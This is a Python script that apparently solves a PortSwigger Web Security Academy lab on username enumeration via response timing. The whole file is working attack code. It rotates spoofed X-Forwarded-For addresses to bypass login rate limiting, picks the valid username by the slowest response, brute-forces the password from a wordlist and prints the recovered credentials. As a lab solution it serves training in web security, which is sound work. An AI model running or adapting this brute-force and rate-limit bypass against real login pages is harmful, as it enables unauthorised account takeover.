# Semi-autonomous proof-of-concept script for Portswigger Lab: 
# "Username enumeration via response timing"
# Only cookies and url must be entered in main() to work 
# (and this could be easily automated as well)

import requests
import sys

ERROR_CODE = 1
MAX_LOGIN_ATTEMPTS = 3


def read_into_list(file):
    list = []

    with open(file) as file_object:
        contents = file_object.readlines()
        for line in contents:
            list.append(line.strip())

    return list


def get_login_request_response_time(url, cookies, user, password):
    data = {
            "username": user,
            "password": password,
    }
    headers = {
            "X-Forwarded-For": "127.0.0.34",
    }

    try:
        response = requests.post(
            url, cookies=cookies, data=data, headers=headers)
    except Exception as general_exception:
        print(f"[INFO ] An exception occurred: {general_exception}")
        sys.exit(ERROR_CODE)

    if "Invalid" in response.text:
        message = "[INFO ] Login request response time:"
        message += f"\n{response.elapsed} microseconds"
        print(message)
        return response.elapsed
    else:
        print("[INFO ] Failed to calculate login request response time")
        sys.exit(ERROR_CODE)


def enumerate_user_based_on_response_timing(
        url, cookies, users, password_placeholder, valid_user_response_time):
    login_attempts = 0
    ip_octet = 35
    ip_address = f"127.0.0.{ip_octet}"

    user_response_times = {}
    response_times = []

    for user in users:
        if ip_octet >= 255:
            break

        data = {
            "username": user,
            "password": password_placeholder,
        }
        bruteforce_bypass_header = {
            "X-Forwarded-For": ip_address,
        }
        
        try:
            response = requests.post(url, cookies=cookies, data=data, 
                                     headers=bruteforce_bypass_header)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if response.status_code != 200:
            print("[INFO ] An error occurred while enumerating the username")
            sys.exit(ERROR_CODE)
         
        if "Invalid" not in response.text:
            print("[INFO ] Failed to circumvent the bruteforce protection")
            sys.exit(ERROR_CODE)

        response_time = response.elapsed
        response_times.append(response_time)
        user_response_times[user] = response_time

        login_attempts += 1

        if login_attempts >= 3:
            ip_octet += 1
            ip_address = f"127.0.0.{ip_octet}"
            login_attempts = 0
        
    longest_response_time = max(response_times)

    for user, response_time in user_response_times.items():
        if response_time == longest_response_time:
            valid_user = user

    print(f"Enumerated valid user '{valid_user}'!")
    return valid_user


def bruteforce_password(url, cookies, user, passwords):
    login_attempts = 0
    ip_octet = 70
    ip_address = f"127.0.0.{ip_octet}"

    for password in passwords:
        if ip_octet >= 255:
            break
        data = {
            "username": user,
            "password": password,
        }
        bruteforce_bypass_header = {
            "X-Forwarded-For": ip_address,
        }

        try:
            response = requests.post(url, cookies=cookies, data=data, 
                                     headers=bruteforce_bypass_header)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if response.status_code != 200:
            print("[INFO ] An error occurred while bruteforcing the password")
            sys.exit(ERROR_CODE)
         
        if "incorrect login" in response.text:
            print("[INFO ] Failed to circumvent the bruteforce protection")
            sys.exit(ERROR_CODE)

        if "Invalid" not in response.text and "incorrect login" not in response.text:
            print(
                f"[INFO ] Enumerated password '{password}' for user '{user}'!"
            )  
            return password
        
        login_attempts += 1

        if login_attempts >= 3:
            ip_octet += 1
            ip_address = f"127.0.0.{ip_octet}"
            login_attempts = 0


def main():
    url = "" \
    "https://0a82006504f281cd803471db007d008b.web-security-academy.net/login" \
    ""
    cookies = {
        "session": "lIAuSPwSeN0rpvOJjBd6e4ZMOTT385O8",
    }
    valid_user = "wiener"
    password_placeholder = valid_user * 5
    users_file = "users.txt"
    passwords_file = "passwords.txt"

    users = read_into_list(users_file)
    passwords = read_into_list(passwords_file)

    print("[DEBUG] Getting valid user login request response time ...")
    valid_user_response_time = get_login_request_response_time(
        url, cookies=cookies, user=valid_user, password=password_placeholder)

    print()

    print(
        "[DEBUG] Attempting to enumerate user based on login response time ..."
    )
    valid_user = enumerate_user_based_on_response_timing(
        url, cookies=cookies, users=users, 
        password_placeholder=password_placeholder, 
        valid_user_response_time=valid_user_response_time)
    
    print()

    print(
        f"[DEBUG] Attempting password bruteforce attack on user '{valid_user}'"
    )
    password = bruteforce_password(
        url=url, cookies=cookies, user=valid_user, passwords=passwords
    )

    print()

    login_credentials = f"User: '{valid_user}' \nPassword: '{password}'"
    print(f"[INFO] Harvested credentials: \n{login_credentials}")


if __name__ == "__main__":
    main()
